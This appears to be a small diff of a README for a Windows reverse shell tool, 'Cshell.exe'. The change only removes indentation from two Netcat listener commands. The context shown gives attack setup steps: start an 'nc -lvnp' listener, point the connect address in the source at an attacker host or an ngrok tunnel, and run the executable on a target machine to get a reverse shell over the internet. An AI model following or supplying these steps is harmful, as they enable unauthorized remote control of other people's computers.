@@ -46,7 +46,7 @@ InetPton(AF_INET, "<IP/Hostname>", &server.sin_addr); // Replace with your IP/Ho
    1. Host a listener on the specified port. You can use tools like `Netcat` or `Metasploit` to listen for the incoming connection:
 
 ```bash
-    nc -lvnp 4444
+nc -lvnp 4444
 ```
    2. Replace `4444` with the port you configured in the source code.
 
@@ -84,7 +84,7 @@ InetPton(AF_INET, "0.tcp.ngrok.io", &server.sin_addr); // ngrok forwarding addre
 4. Run Your Listener: Start a listener on the ngrok-exposed port using `Netcat` or any other reverse shell listener tool:
 
 ```bash
-    nc -lvnp 12345
+nc -lvnp 12345
 ```
 5. Run the Shell: Execute the Cshell.exe on the target machine. It will now connect through ngrok, allowing you to get a reverse shell over the internet.
 
